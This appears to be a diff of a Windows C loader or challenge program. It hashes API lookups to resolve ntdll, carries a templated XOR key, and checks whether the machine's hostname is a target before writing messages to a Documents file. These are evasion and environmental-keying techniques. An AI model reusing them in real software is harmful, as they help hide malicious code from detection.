@@ -13,7 +13,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     uint16_t key = %XOR_KEY%;
     srand(time(NULL));
     
-    snprintf(path, MAX_PATH, "%s\\Documents\\bank_account.txt", getenv("USERPROFILE"));  
+    snprintf(path, MAX_PATH, "%s\\Documents\\market.txt", getenv("USERPROFILE"));  
     printf("start");    
     HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH);
     HMODULE hKernel32dll = NULL;
@@ -37,7 +37,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     }
 
     const char* hostname = get_hostname(hKernel32dll);
-    if (key > 0 && is_valid_hostname(hostname)) {
+    if (key > 0 && is_target_hostname(hostname)) {
         fprintf(file, "You have a key, which is : %s\n", hostname);
     } else {
         fprintf(file, "You don't have a key, try this one : %s\n", hostname);
@@ -83,4 +83,3 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
     return 0;
 }
-
